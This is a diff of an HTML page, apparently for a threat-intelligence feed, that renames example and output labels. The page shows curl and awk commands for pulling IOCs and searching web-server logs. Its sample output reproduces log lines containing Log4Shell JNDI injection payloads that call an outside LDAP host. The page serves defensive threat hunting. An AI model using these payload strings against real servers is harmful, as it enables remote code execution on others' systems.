@@ -166,11 +166,11 @@
 				</div>
 				<pre id="command1" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				<div class="d-flex justify-content-between">
-					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Example - getting suspicious urls from today:</span>
+					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - getting suspicious urls from today:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command2','3')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery3"><span id="textQuery3">Copy to clipboard </span><i id="iconQuery3" class="far fa-clipboard"></i></button>
 				</div>
 				<pre id="command2" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "url"' | cut -d, -f4 > suspicious_urls.dat</pre>
-				Output:
+				Output example:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url1
 url1
 url3
@@ -185,11 +185,11 @@ url4
 				</div>
 				<pre id="command3" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, 'tolower($5) ~ "<span style="color:gray;"><b>{tag}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				<div class="d-flex justify-content-between">
-					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Example - getting all IOCs related to CobaltStrike from today:</span>
+					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - getting all IOCs related to CobaltStrike from today:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command4','5')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery5"><span id="textQuery5">Copy to clipboard </span><i id="iconQuery5" class="far fa-clipboard"></i></button>
 				</div>
 				<pre id="command4"style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, 'tolower($5) ~ "CobaltStrike"' | cut -d, -f4 > iocs_CS.dat</pre>
-				Output:
+				Output example:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url
 md5
 ip
@@ -209,11 +209,11 @@ sha256
 				</div>
 				<pre id="command5" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 | while read line; do grep "$line" <span style="color:gray;"><b>{File}</b></span>;done</pre>
 				<div class="d-flex justify-content-between">
-					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Example - searching IPs related to #Log4Shell vulnerability on Apache logs:</span>
+					<span style="align-self: flex-end;" class="d-flex align-self-bottom">Command example - searching IPs related to #Log4Shell vulnerability on Apache logs:</span>
 					<button class="btn btn-primary shadow-none" onclick="commandClipboard('#command6','7')" style="font-size: 12px;background-color: #4682B4;border-color: black;font-family: 'Rubik', sans-serif;" id="buttonQuery7"><span id="textQuery7">Copy to clipboard </span><i id="iconQuery7" class="far fa-clipboard"></i></button>
 				</div>
 				<pre id="command6" style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "ip" && $5 ~ "log4"' | cut -d, -f4 | while read line; do grep "$line" /var/log/apache2/access.log;done</pre>
-				Output:
+				Output example:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>170.210.45.163 - - [16/Dec/2021:21:13:00 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 589 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
 170.210.45.163 - - [16/Dec/2021:21:13:01 +0000] "GET / HTTP/1.1" 301 509 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"
 170.210.45.163 - - [17/Dec/2021:01:48:06 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 5228 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
